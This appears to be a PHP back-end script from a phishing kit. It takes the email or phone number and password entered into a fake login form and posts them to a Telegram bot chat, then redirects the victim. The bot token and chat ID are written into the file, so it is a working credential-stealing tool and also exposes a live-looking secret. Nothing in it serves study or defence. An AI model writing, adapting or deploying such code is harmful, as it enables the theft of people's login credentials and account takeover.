<?php

	if(isset($_POST['Login'])){

		$uname = $_POST['email'];
		$pass = $_POST['password'];

		$parameters  = array(
		"chat_id" => '-1001892111363',
		'text' => "email or phone : $uname\r\nPass : $pass"
		);

		$exec = send("sendMessage",$parameters);

		if($exec){
			header("Location:./");
		}


		
	}



	//sending message
	function send($method, $parameters){
			$bot_token = "5640910643:AAHZovo7fnFAS5WAGSnppSQkqBPivgNRZEc";
			$url = "https://api.telegram.org/bot$bot_token/$method";

			if(!$curl = curl_init()){
				echo"helllllllooo";
				exit();
				
			}


			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $parameters);
			curl_setopt($curl, CURLOPT_URL, $url);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			$output = curl_exec($curl);
			return $output;
		}

?>